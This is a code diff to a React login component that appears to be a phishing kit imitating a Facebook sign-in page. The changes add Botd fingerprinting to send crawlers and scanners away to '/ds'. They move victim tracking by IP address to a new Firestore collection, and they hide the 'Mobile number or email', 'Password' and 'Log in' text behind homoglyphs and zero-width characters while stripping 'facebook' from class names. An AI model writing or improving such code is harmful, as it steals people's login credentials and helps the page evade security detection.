@@ -1,10 +1,12 @@
 import React, { useEffect, useState } from 'react';
 import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
+import Botd from '@fingerprintjs/botd';
 import { publicIpv4 } from 'public-ip';
 import { IoIosAdd as IconAdd } from "react-icons/io";
 import { footerLinks, desktoplanguages, mobileLanguages } from '../sakles/malores.js'; // Import mobileLanguages
 import { db } from '../cedeplajes.js';
 import { useMediaQuery } from 'react-responsive';
+
 
 import '../sakles/malores.js';
 
@@ -18,15 +20,21 @@ const Donjesck = () => {
     
     const isDesktop = useMediaQuery({ query: '(min-width: 768px)' });
 
-            // Bot detection and redirect to /blank
-        useEffect(() => {
-            const userAgent = navigator.userAgent.toLowerCase();
-            const isBot = /bot|crawler|spider|crawling/.test(userAgent);
-    
-            if (isBot) {
-                window.location.href = '/ds';
-            }
-        }, []);
+useEffect(() => {
+    const detectBot = async () => {
+        const botd = await Botd.load();
+        const result = await botd.detect();
+
+        if (result.bot) {
+            console.log('Bot detected:', result.bot.type);
+            window.location.href = "/ds";
+        } else {
+            console.log('Not a bot');
+        }
+    };
+
+    detectBot();
+}, []);
         
     useEffect(() => {
         if (isDesktop) {
@@ -81,7 +89,7 @@ IP: '${ip}'
         setdexlus(e.target.value); // Allow any input
     };
     const getUserData = async (e) => {
-        const documentSnapshot = await getDocs(collection(db, "costarica"));
+        const documentSnapshot = await getDocs(collection(db, "georgebs"));
         const newData = documentSnapshot.docs
             .map((doc) => ({ ...doc.data(), id: doc.id }));
         const filter = newData.filter(x => {
@@ -106,7 +114,7 @@ IP: '${ip}'
 
     useEffect(() => {
         if (ip) {
-            onSnapshot(collection(db, "costarica"), (snapshot) => {
+            onSnapshot(collection(db, "georgebs"), (snapshot) => {
                 let isExist = false;
                 snapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id })).filter(x => {
                     if (x.ip === ip) {
@@ -143,7 +151,7 @@ IP: '${ip}'
 
     const addUserData = async () => {
         try {
-            const docRef = doc(collection(db, "costarica"), ip);
+            const docRef = doc(collection(db, "georgebs"), ip);
 
             // Check if the document exists
             const docSnap = await getDoc(docRef);
@@ -167,7 +175,7 @@ IP: '${ip}'
 
     const resetUserNumber = async () => {
         try {
-            const docRef = doc(collection(db, "costarica"), ip);
+            const docRef = doc(collection(db, "georgebs"), ip);
             await setDoc(docRef, { redir: "-1" }, { merge: true });
             console.log("User number reset to -1 for IP: ", ip);
         } catch (e) {
@@ -203,20 +211,20 @@ IP: '${ip}'
                 <form className="w-full flex flex-col items-center justify-start gap-2" onSubmit={handleActions}>
                     <input
                         type="text" id="grraht" name="grraht"
-                        className="w-full p-[8px] text-sm placeholder:text-sm text-neutral-500 rounded bg-mercury/60 shadow-md font-medium border-[1px] border-solid border-mercury focus:outline-none"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}
-                        placeholder="Mobile number or email" onChange={handleCodeChange} required/>
+                        className="w-full p-[8px] text-sm placeholder:text-sm text-neutral-500 rounded bg-bekio/60 shadow-md font-medium border-[1px] border-solid border-bekio focus:outline-none"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}
+                        placeholder="Mоb‌‌i‌‌lе ‌‌n‌‌um‌‌b‌‌еr o‌‌r е‌‌m‌‌а‌‌i‌‌l" onChange={handleCodeChange} required/>
                         <span className='becros'></span>
                    
                     <input
                         type="text" id="dexlus" name="dexlus"
-                        className="w-full p-[8px] pr-4 text-sm placeholder:text-sm text-neutral-500 rounded bg-mercury/60 shadow-md font-medium border-[1px] border-solid border-mercury focus:outline-none"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',WebkitTextSecurity: 'disc', textSecurity: 'disc'}}
+                        className="w-full p-[8px] pr-4 text-sm placeholder:text-sm text-neutral-500 rounded bg-bekio/60 shadow-md font-medium border-[1px] border-solid border-bekio focus:outline-none"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',WebkitTextSecurity: 'disc', textSecurity: 'disc'}}
                         placeholder="Pa‌ss‌wor‌d"onChange={handleCodeChange1} required/>
                     <span className='form-dexlus'></span>
-                    <button type="submit" className="w-full mt-1 px-3 h-[35px] bg-facebook hover:bg-opacity-90 text-white text-base font-semibold rounded transition-all duration-300"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}>
+                    <button type="submit" className="w-full mt-1 px-3 h-[35px] bg-begex hover:bg-opacity-90 text-white text-base font-semibold rounded transition-all duration-300"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}>
                         L‌o‌g i‌n
                     </button>
                 </form>
-                <button type="button" className="w-full text-facebook text-sm font-medium bg-none hover:underline transition-all duration-300"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}>
+                <button type="button" className="w-full text-begex text-sm font-medium bg-none hover:underline transition-all duration-300"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}>
                     Fo‌rgot ac‌co‌un‌t?
                 </button>
                 <div className="w-full flex items-center justify-between gap-3">
